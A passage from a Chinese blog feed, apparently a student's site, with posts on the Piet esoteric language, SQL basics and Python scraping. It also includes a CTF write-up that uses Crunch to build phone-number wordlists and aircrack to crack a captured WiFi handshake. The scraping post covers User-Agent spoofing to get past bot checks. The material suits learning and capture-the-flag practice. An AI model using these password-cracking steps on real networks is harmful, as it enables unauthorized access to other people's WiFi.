<p>​	Piet 是由 DavidMorgan-Mar 设计，其方案是位图，看起来像抽象艺术设计。编译指导图像周围移动，从一个连续颜色的区域下的一个 “指针”。通过一个地区的指针退出时的程序进行。Piet 编程语言的程序看起来都像抽象画的位图，基本的构建块就是颜色块。它支持 20 种不同的颜色，有些实现支持的更多。编译器由图像周围的移动 “指针” 引导，在图像中从一个色块移动到下一个。Piet 理解起来是非常深奥，可能都没有办法称它为一种语言。因为 Piet 是用颜色来编写代码。</p>
<p>理论上只有 18 种颜色才具有真实的作用，所以上面两幅图其实运行结果都是 Hello world</p>
<p><strong>可以用来编译 npiet 的在线解释器：</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmVydG5hc2UuZGUvbnBpZXQvbnBpZXQtZXhlY3V0ZS5waHA=">https://www.bertnase.de/npiet/npiet-execute.php</span></p>
<p>深奥的编程语言的目的之一是模仿或欺骗编程领域的现有语言和趋势，使代码固有地混淆、混淆和不可读平时很难遇到他们，如果遇到了也要心里臭骂一顿那个让我们遇到的人，让他装比。</p>
<p>好了 烧年，你想学哪门？还是自己写一个？</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXZlcm5vdGUuY29tL3NoYXJkL3MzMDcvY2xpZW50L3Nudj9ub3RlR3VpZD1mMDk0MzNiMi1mMjUzLTQxZWItOTFmNi1mODNkYWRjNzdhZWYmYW1wO25vdGVLZXk9ODg4MjAzOWQ5ZjBlYWZmMzVmMTA2OTYwMWMzOTdmZjgmYW1wO3NuPWh0dHBzJTNBJTJGJTJGd3d3LmV2ZXJub3RlLmNvbSUyRnNoYXJkJTJGczMwNyUyRnNoJTJGZjA5NDMzYjItZjI1My00MWViLTkxZjYtZjgzZGFkYzc3YWVmJTJGODg4MjAzOWQ5ZjBlYWZmMzVmMTA2OTYwMWMzOTdmZjgmYW1wO3RpdGxlPUhlbGxvJTJCd29ybGQlMkJwcm9ncmFtJTJCaW4lMkJlc290ZXJpYyUyQmxhbmd1YWdlcyUyQi0lMkJFc29sYW5n">参考更多奇异编码</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly90aW8ucnVuLyM=">想让他们跑起来</span></p>
]]></content>
      <categories>
        <category>wiki</category>
        <category>编码</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>想蹭网先解开密码&amp;Crunch密码生成器</title>
    <url>/%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-Crunch%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</url>
    <content><![CDATA[<p>Crunch 普遍用于生成密码字典，配合其他工具使用进行暴力破解。作为 kali linux 下前十名最常使用的工具之一，用途非常广泛。<br />
<a id="more"></a></p>
<h3 id="-t-命令如下"><a class="anchor" href="#-t-命令如下">#</a> -t 命令如下:</h3>
<p>-t '@'/','/'%'/'<sup>', 指定模式，'@'/','/'%'/'</sup>' 分别代表意义如下:</p>
<p>@ 插入小写字母<br />
，插入大写字母<br />
 % 插入数字<br />
 ^ 插入特殊符号<br />
使用实例：(当确定使用的对象类型但不具体知道是那些时可以使用占位符)<br />
 例 1:<br />
 生成缺位的手机号码 (有可能作为路由器密码或 wifi 密码（8-11 位）)<br />
 命令：crunch 11 11   -t  1503453%%%%   -o 1.txt 或 &gt;&gt; 1.txt (以 % 位数字占位符)<br />
 例 2:<br />
crunch 4 4  + + 123 + -t %%@^</p>
<p>生成 4 位密码，其中格式为 &quot;两个数字&quot;+&quot;一个小写字母&quot;+&quot;常见符号&quot;(其中数字这里被指定只能为 123 组成的所有 2 位数字组合). 比如 12f#,32j^,13t$...etc..</p>
<h3 id="crunch中常用的命令参数"><a class="anchor" href="#crunch中常用的命令参数">#</a> Crunch 中常用的命令参数</h3>
<p>-b ---&gt; 按大小分割字典文件，后接 20mib/mb/kb 等<br />
 - c ---&gt; 密码个数<br />
 - d ---&gt; 限制出现相同元素的个数 如 - d 3 代表不会出现 aabbbb 的情况<br />
 - e ---&gt; 定义停止生成密码 如 -e abcd 代表到 abcd 停止生成密码<br />
 - f ---&gt; 调用密码库文件 如 - f charset.lst mixalpha-numeric 代表调用密码库 charset.lst 中 mixalpha-numeric 项目字符<br />
 - i ---&gt; 改变输出格式<br />
 - t ---&gt; 定义输出格式<br />
 - l ---&gt; 与 - t 搭配使用<br />
 - p ---&gt; 定义密码组合元素<br />
 - m ---&gt; 与 - p 搭配使用<br />
 - o ---&gt; 保存为<br />
 - q ---&gt; 读取字典<br />
 - r ---&gt; 从某处重新开始<br />
 - s ---&gt; 第一个密码从 xxx 开始<br />
 - z ---&gt; 打包压缩 格式支持 gzip bzip2 lzma 7z</p>
<h3 id="实验案例"><a class="anchor" href="#实验案例">#</a> 实验案例</h3>
<p><mark>1. 在终端下输入： crunch 1 4 abcd &gt;&gt;2.txt</mark><br />
 意思是生成最小为 1, 最大为 4 的由 abcd 为元素的所有组合，结果导出为 2.txt</p>
<p><mark>2. 在终端下输入 crunch 4 5 -p yale test</mark><br />
 意思是生成以 &quot;yale&quot;&quot;test&quot; 为元素的所有密码组合</p>
<p><mark>3. 在终端下输入 crunch 1 4 -o START -c 6000</mark><br />
 意思是生成最小为 1 位，最大为 4 位元素为所有小写字母的密码字典的前 6000 个密码并预估所需时间</p>
<p><mark>4. 在终端下输入 crunch 4 4 abcd + 1234 @#!* -t ^^%@</mark><br />
意思是生成 4 位密码，格式为 &quot;字符 + 数字 + 字母&quot; 且字符范围是 @#!*, 数字范围是 1234, 字母范围是 abcd;</p>
<p><mark>5. 当我们遇到字典文件过大时，我们需要把他们切分成几个文件，这时输入<br />
 crunch 3 4 -b 1mib -0 START</mark><br />
 代表以 1M 进行分割</p>
<p>了解完 Crunch 的大概内容后，我们可以开始着手本题了.</p>
<h3 id="分析本题"><a class="anchor" href="#分析本题">#</a> 分析本题</h3>
<p>到手后是一份 cap, 打开流量分析一波没有发现 flag.<br />
 根据 HINT 我们会发现这是一道 WiFi 密码破解，提示密码就是破解出的手机号，手机号已经给出前七位我们可以运用上面的 Crunch 命令破解；<br />
let's do it<br />
<img data-src="https://i.loli.net/2021/02/14/zYeNb21r6WRC4cu.png" alt="" /><br />
 写好 payload 后我们已经生成了字典接下来只需要运用好字典破解 cap 就可.</p>
<p><img data-src="https://i.loli.net/2021/02/14/gT1qhHXPdAFOK43.png" alt="" /><br />
采用 aircrack 破解密码，上面提示要我们输入一个数字，我填的 3; 别问，问就是我也不清楚.<br />
<img data-src="https://i.loli.net/2021/02/14/oPwGITg1nh2EcqZ.png" alt="" /><br />
 最后解出手机号</p>
<p><span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{13910407686}</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>aircarck破解wifi密码(其一)</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库简介及SQL语法</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B%E5%8F%8ASQL%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="数据库是什么"><a class="anchor" href="#数据库是什么">#</a> 数据库是什么</h1>
<p>数据库就是将大量的数据保存起来，通过计算机加工而成的可以高效访问的数据集合。数据库是长期储存在计算机内，有组织的      可共享的数据集合。也可以通俗的理解成储存数据的仓库。</p>
<p>我们身边的数据库</p>
<pre><code>1. 在你过生日的时候支付宝给你发来祝福

2. 中国移动发送短信提醒你流量的使用情况

3. 登录淘宝后，最近浏览过的商品会推送给你

这是因为支付宝，移动，淘宝掌握了顾客的一些信息，并且拥有能够从大量汇总信息中快速获取所需信息的设备（计算机系统）
</code></pre>
<h1 id="常见数据库"><a class="anchor" href="#常见数据库">#</a> 常见数据库</h1>
<pre><code>①Oracle Database：甲骨文公司

②SQL Server：微软公司

③DB2：IMB公司

④Postgre SQL：开源

⑤MySQL：开源

⑥Access：微软公司（古董）
</code></pre>
<h1 id="数据库的基本知识"><a class="anchor" href="#数据库的基本知识">#</a> 数据库的基本知识</h1>
<p>数据库结构</p>
<ol>
<li>
<p>服务端：用于接收并处理其他程序发出的请求的的程序（软件），或者是安装此类程序的设备（计算机）</p>
</li>
<li>
<p>客户端：向服务器发出请求的程序（软件），或者是安装此类程序的设备（计算机）</p>
</li>
<li>
<p>库：就是一堆表组成的数据集合</p>
</li>
<li>
<p>表（table）：类似 Excel，又行和列组成的二维表</p>
</li>
<li>
<p>字段：表的列（垂直方向），可以理解成表格的表头</p>
</li>
<li>
<p>记录：表的行（水平方向），可以理解为表里面的数据（关系数据库必须以行为单位进行数据读写）</p>
</li>
</ol>
<pre><code>比如：Web访问：服务端：访问的服务器（中间件）客户端：浏览器
</code></pre>
<h1 id="基本sql语法"><a class="anchor" href="#基本sql语法">#</a> 基本 SQL 语法</h1>
<ol>
<li>
<p>数据库操作</p>
<p>CREATE DATABASE db_name;【新建数据库】<br />
Show   databases;【查看所有数据库】<br />
DROP DATABASE db_name;【删除数据库】<br />
USE db_name;【进入库】</p>
<p><mark>SQL 语句结尾一定要用 ';' 结束</mark></p>
</li>
<li>
<p>数据库的连接<br />
在 sql 根目录打开命令行 —&gt; 输入：mysql-u root -p_  （访问本地的 mysql）—&gt; 密码 password 为 root—&gt; 回车进入就相当      于一个客户端了</p>
</li>
</ol>
<p>有时会有倒霉蛋遇到一些错误，这可能大部分是因为密码错误的问题，有些人之前装过 sql 然后这一次输入的密码和上一次设置的有出入就导致了一些问题的发生。我将解决常见问题的博客放在下面，仅供参考。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTg3MTUxL2FydGljbGUvZGV0YWlscy84NDMxNjAwOA==">mysql 提示 Can't connect to MySQL server on localhost (10061) 解决方法</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NzaDE4MDcyNjY0ODkvYXJ0aWNsZS9kZXRhaWxzLzk0NDc3OTI4"> Access denied for user ‘root‘@‘localhost‘ (using password: YES) 无法打开的解决方法</span></p>
<p>进行与数据库的交互</p>
<p>例如：    先连接数据库</p>
<pre><code>      create database sjz;【建库】

      show databases;【查看所有库名】
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/19/Vs5MZ7WpoTJQuby.png" alt="databases.png" title="创建了一个库并且将它展示出来" /></p>
<pre><code>      use sjz【进入sjz数据库】

      drop database sjz;【删除sjz数据库】
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/19/HC1Up8P64lndsQG.png" alt="2.png" /></p>
<h2 id="数据表操作"><a class="anchor" href="#数据表操作">#</a> 数据表操作</h2>
<p>CREATE TABLE table_name (column_mame cdumn_type);【新建表】（column_mame：字段名， cdumn_type：字段类型）<br />
Show tables;【查看所有数据库】<br />
DROP TABLE table_name【删除表格】</p>
<p><img data-src="https://i.loli.net/2021/08/19/ys8wEc2ad6nAK1o.png" alt="4.png" /></p>
<p>Desc table_name【查看表的类型】<br />
<img data-src="https://i.loli.net/2021/08/19/gS4kN5MVoX6rJAQ.png" alt="5.png" /></p>
<p>ALTER TABLE table_name DROP i;【删除表里面的字段】</p>
<p>ALTER TABLE table_name ADD i INT;【添加表里面的字段】</p>
<p><img data-src="https://i.loli.net/2021/08/19/Kdes4NCgQwOfALv.png" alt="6.png" /></p>
<p>ALTER table table change b bbb int;【修改字段名和属性】</p>
<p><img data-src="https://i.loli.net/2021/08/19/OIqYvJcn8fEwsUP.png" alt="7.png" /></p>
<p>ALTER TABLE  &lt;表名&gt; MODIFY &lt; 字段 1&gt;&lt; 数据类型 &gt; MODIFY 只能修改数据类型</p>
<p>表中有六大约束：主键约束、外键约束、非空约束、唯一约束、默认约束、自动增加</p>
<h3 id="主键约束"><a class="anchor" href="#主键约束">#</a> 主键约束</h3>
<p>什么是主键？</p>
<p>PRIMARY KEY (primary key)：独一无二 (唯一) 和不能为空 (非空)，在表中增加记录时，在该字段下的数据不能重复，不能为空，在表中增加两条记录，如果 id 字段用了主键约束。则 id 不能一样，并且不能为空。一般每张表中度有一个字段为主键，唯一标识这条记录。以后需要找到该条记录也可以同这个主键来确认记录<br />
因为主键是唯一的，并且非空，一张表中每个记录的主键度不一样，所以根据主键也就能找到对应的记录。而不是多条重复的记录。<br />
如果没有主键，那么表中就会存在很多重复的记录，那么即浪费存储空间，在查询时也消耗更多资源。</p>
<ol>
<li>单字段主键约束</li>
</ol>
<p><img data-src="https://i.loli.net/2021/08/19/JvM7xpVO5AgQo4K.png" alt="11.png" /></p>
<p>除此以外；</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE TABLE student(</pre></td></tr><tr><td data-num="2"></td><td><pre>id INT(11),</pre></td></tr><tr><td data-num="3"></td><td><pre>name VARCHAR(12),</pre></td></tr><tr><td data-num="4"></td><td><pre>age INT(11),</pre></td></tr><tr><td data-num="5"></td><td><pre>PRIMARY KEY(id)</pre></td></tr><tr><td data-num="6"></td><td><pre>);</pre></td></tr></table></figure><p>两种方法都可以</p>
<ol start="2">
<li>多字段主键约束 (联合主键)</li>
</ol>
<p><img data-src="https://i.loli.net/2021/08/19/ste37IpTfhwZnaK.png" alt="屏幕截图 2021-08-19 151151.png" /></p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE TABLE student(　　　　　　　　　　　　</pre></td></tr><tr><td data-num="2"></td><td><pre>id INT(11) PRIMARY KEY,　　　　　　　　　　　</pre></td></tr><tr><td data-num="3"></td><td><pre>name VARCHAR(12) PRIMARY KEY,　　　　　　</pre></td></tr><tr><td data-num="4"></td><td><pre>age INT(11)　　　　　　　　　　　　　　　　　　　</pre></td></tr><tr><td data-num="5"></td><td><pre>);</pre></td></tr></table></figure><p>这个 id 和 name 都是主键，说明在以后增加的插入的记录中，id 和 name 不能同时一样.<br />
 例如一条记录为 id=1，name=yyy、另一条记录为：id=1，name=zzz。这样是可以的</p>
<h3 id="外键约束"><a class="anchor" href="#外键约束">#</a> 外键约束</h3>
<p>外键约束的特点：</p>
<ol>
<li>
<p>外键约束可以描述任意一个字段 (包括主键)，可以为空，并且一个表中可以有多个外键。但是外键字段中的值必须是另一张表中的主键。</p>
</li>
<li>
<p>这样被外键关联的两种表的关系可以称为父子表或者主从表。子表 (从表) 拥有外键字段的表，父表 (主表) 被外键字段所指向的表。</p>
</li>
<li>
<p>子表被外键约束修饰的字段必须和父表的主键字段的类型一样。</p>
</li>
</ol>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE TABLE tableA(</pre></td></tr><tr><td data-num="2"></td><td><pre>id INT(11),</pre></td></tr><tr><td data-num="3"></td><td><pre>name VARCHAR(22),</pre></td></tr><tr><td data-num="4"></td><td><pre>location VARCHAR(50),</pre></td></tr><tr><td data-num="5"></td><td><pre>PRIMARY KEY(id)</pre></td></tr><tr><td data-num="6"></td><td><pre>);</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>CREATE TABLE tableB(</pre></td></tr><tr><td data-num="9"></td><td><pre>id INT(11),</pre></td></tr><tr><td data-num="10"></td><td><pre>name VARCHAR(22) NOT NULL,</pre></td></tr><tr><td data-num="11"></td><td><pre>deptId INT(11),</pre></td></tr><tr><td data-num="12"></td><td><pre>PRIMARY KEY(id),</pre></td></tr><tr><td data-num="13"></td><td><pre>CONSTRAINT tableA_tableB_1 FOREIGN KEY(deptId) REFERENCES tableA(id)</pre></td></tr><tr><td data-num="14"></td><td><pre>);</pre></td></tr></table></figure><p><mark>解释：tableB 中有一个名为 tableA_tableB1 的外键关联了 tableA 和 tableB 两个表，被外键约束修饰的字段为 tableB 中的 deptId，主键字段为 tableA 中的 id</mark></p>
<p><img data-src="https://i.loli.net/2021/08/19/5GqRjeT4cwVYfrQ.png" alt="8.png" title="desc查询" /></p>
<p>通俗来讲，有两张表，一张表是 emp (员工) 表，另一张表是 dept (部门) 表，一个员工属于一个部门。<br />
那么如何通过员工能让我们知道他在哪个部门呢？那就只能在员工表中增加一个字段，能代表员工所在的部门，那该字段就只能是存储 dept 表中的主键了（因为主键是唯一的，才能确实是哪个部门，进而代表员工所在的部门，如果是部门名称，有些部门的名称可能是同名。就不能区分了。)<br />
<mark> 像这样的字段，就符合外键的特点，就可以使用外键约束，使该字段只能够存储另一张表的主键。</mark><br />
如果不被外键约束，那么该字段就无法保证存储进来的值就一定是另一张表的主键值。</p>
<p>其他的约束遇见的不是很多，参考<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2hnay9wLzYxMzEyODUuaHRtbA=="> MySQL (一) 数据表数据库的基本操作</span></p>
<p><mark>删除表的外键约束</mark></p>
<p>ALTER TABLE &lt;表名称&gt; DROP FOREIGN KEY &lt; 外键约束名 &gt;</p>
<p>外键约束名指的不是被外键约束修饰的字段名，切记，而是我们在创建外键约束关系时取的名字。即上面出现的 tableA_tableB_1</p>
<p><mark>删除被其他表关联的主表</mark></p>
<p>在有外键关联关系的两张表中，如果删除主表，那么是删不掉的，并且会报错。因为有张表依赖于他。那怎么办呢？针对这种情况，总共有两种方法：</p>
<ol>
<li>
<p>先删除你子表，然后在删除父表，这样就达到了删除父表的目的，但是子表也会被删除</p>
</li>
<li>
<p>先解除外键关系，然后在删除父表，这样也能达到目的，并且保留了子表，只删除我们不需要的父表</p>
</li>
</ol>
<h3 id="mysql主键自增长"><a class="anchor" href="#mysql主键自增长">#</a> MySQL 主键自增长</h3>
<p>在 MySQL 里，当主键定义为自增长后，主键的值就不需要自己再输入数据了，而是由数据库系统根据定义自动赋值，<br />
在默认的情况下，AUTO_INCREMENT 的初始值为 1，每新增一条记录，字段值就会自动加 1；如果达到上限，AUTO_INCREMENT 就会失效。<br />
一个表中只能有一个字段使用 AUTO_INCREMENT 约束，且该字段必须有唯一索引，以避免序号重复（即为主键或主键的一部分）；<br />
AUTO_INCREMENT 约束的字段只能是整数类型；</p>
<p><img data-src="https://i.loli.net/2021/08/19/ZHMPoqGjaNUdWzc.png" alt="微信截图_20210819202506.png" /></p>
<p>此时可以不用再手动插入 st_id 的数据，id 随着用户输入的个数自动增加.</p>
<p>但是在设置学号的时候不一定是从 1 开始的，比如从 2000150001 开始，则需要在建表之后设置自增的起始数据。即在最后一个括号和；之间插入</p>
<p>auto_increment=2001150006，此时，st_id 就会从 2001150006 开始依次递增.</p>
<p>还有其他的一些语法：</p>
<ol>
<li>
<p>插入数据：INSERT [INTO] user (username,password) VALUES ('admin','admin');</p>
</li>
<li>
<p>修改数据：UPDATE table_name SET col_name=value,...[WHERE 字段 = 字段值]</p>
</li>
<li>
<p>查询数据：SELECT user,password FROM user WHERE 字段 = 字段值</p>
</li>
<li>
<p>删除数据：DELETE FROM table_name where 字段 = 字段值</p>
</li>
</ol>
]]></content>
      <categories>
        <category>WEB前后端原理</category>
        <category>后端基础SQL</category>
      </categories>
      <tags>
        <tag>后端基础SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫第一步——Request和数据解析</title>
    <url>/%E7%88%AC%E8%99%AB--request/</url>
    <content><![CDATA[<p>在此，学习爬虫只是为了应付下一年的大创项目。</p>
<p><a id="more"></a></p>
<h2 id="request模块"><a class="anchor" href="#request模块">#</a> request 模块</h2>
<ul>
<li>urllib 模块</li>
<li>request 模块</li>
</ul>
<p>request 模块：python 中原生的一款基于网络请求的模块，功能非常强大，简单便捷，效率极高</p>
<h2 id="使用流程"><a class="anchor" href="#使用流程">#</a> 使用流程</h2>
<ul>
<li>指定 url</li>
<li>发起请求</li>
<li>获取响应数据</li>
<li>持久化存储</li>
</ul>
<p>以上也是爬虫的四步法则</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/01/ac5f14be500663ae.jpg" alt="" /></p>
<p>环境安装：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pip install requests</pre></td></tr></table></figure><h2 id="编写"><a class="anchor" href="#编写">#</a> 编写</h2>
<ul>
<li>爬取搜狗页面的页面数据</li>
</ul>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token comment">#指定 url</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  url <span class="token operator">=</span> <span class="token string">'https://www.sogou.com/'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token comment">#发起请求</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token comment">#get 返回一个响应对象</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token comment">#获取响应数据 text 返回的是字符串形式的响应数据</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  page_text <span class="token operator">=</span> response<span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">print</span><span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token comment">#持久化存储</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./sogou.html'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬取结束！'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ul>
<li></li>
</ul>
<h2 id="tips"><a class="anchor" href="#tips">#</a> tips</h2>
<p>UA 检测：门户网站的服务器会检测对应请求载体的标识，若检测到请求的载体身份标识是某一浏览器，说明该请求是正常请求【不是基于浏览器的大都是爬虫】<br />
UA 伪装：让爬虫对应的请求载体身份标识伪装成某一款浏览器</p>
<h2 id="编写-2"><a class="anchor" href="#编写-2">#</a> 编写</h2>
<ul>
<li>简易的网页采集器</li>
</ul>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#UA 检测 (user-agent): 门户网站的服务器会检测对应请求载体的标识，若检测到请求的载体身份标识是某一浏览器，说明该请求是正常请求【不是基于浏览器的大都是爬虫】</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#UA 伪装：让爬虫对应的请求载体身份标识伪装成某一款浏览器</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> requests<span class="token punctuation">.</span>models <span class="token keyword">import</span> Response</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token comment">#UA 伪装：将对应的 user-agent 封装到一个字典中</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>       <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>   url <span class="token operator">=</span> <span class="token string">'https://www.baidu.com/s'</span></pre></td></tr><tr><td data-num="11"></td><td><pre>   <span class="token comment">#处理 url 携带参数：封装到字典</span></pre></td></tr><tr><td data-num="12"></td><td><pre>   Dic <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'plz enter your word:'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>   param <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>       <span class="token string">'wd'</span><span class="token punctuation">:</span>Dic</pre></td></tr><tr><td data-num="15"></td><td><pre>   <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>   <span class="token comment">#发起请求</span></pre></td></tr><tr><td data-num="17"></td><td><pre>   response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>   <span class="token comment">#获得响应数据</span></pre></td></tr><tr><td data-num="20"></td><td><pre>   page_text <span class="token operator">=</span> response<span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="21"></td><td><pre>   fileName <span class="token operator">=</span> Dic<span class="token operator">+</span><span class="token string">'.html'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>   <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>       fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">'保存成功！'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ul>
<li>动态加载数据</li>
<li>首页中对应的企业信息数据是通过 ajax 动态请求到的，详情页的详情数据也是动态加载出来的</li>
<li>观察后发现：<br />
所有的 post 请求的 url 都是一样的，只有参数 id 的值不同<br />
我们可以批量获取多家企业的 id，可以将 id 和 url 形成一个完整的详情页对应详情数据的 ajax 请求的 url</li>
</ul>
<h2 id="编写-3"><a class="anchor" href="#编写-3">#</a> 编写</h2>
<ul>
<li>豆瓣电影排行榜信息</li>
</ul>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>   url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/j/chart/top_list'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   param <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>       <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>       <span class="token string">'interval_id'</span><span class="token punctuation">:</span> <span class="token string">'100:90'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>       <span class="token string">'action'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>       <span class="token string">'start'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>       <span class="token string">'limit'</span><span class="token punctuation">:</span> <span class="token string">'20'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>   <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>   headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>       <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>   <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>   response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>   list_data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>   fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./douban.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td 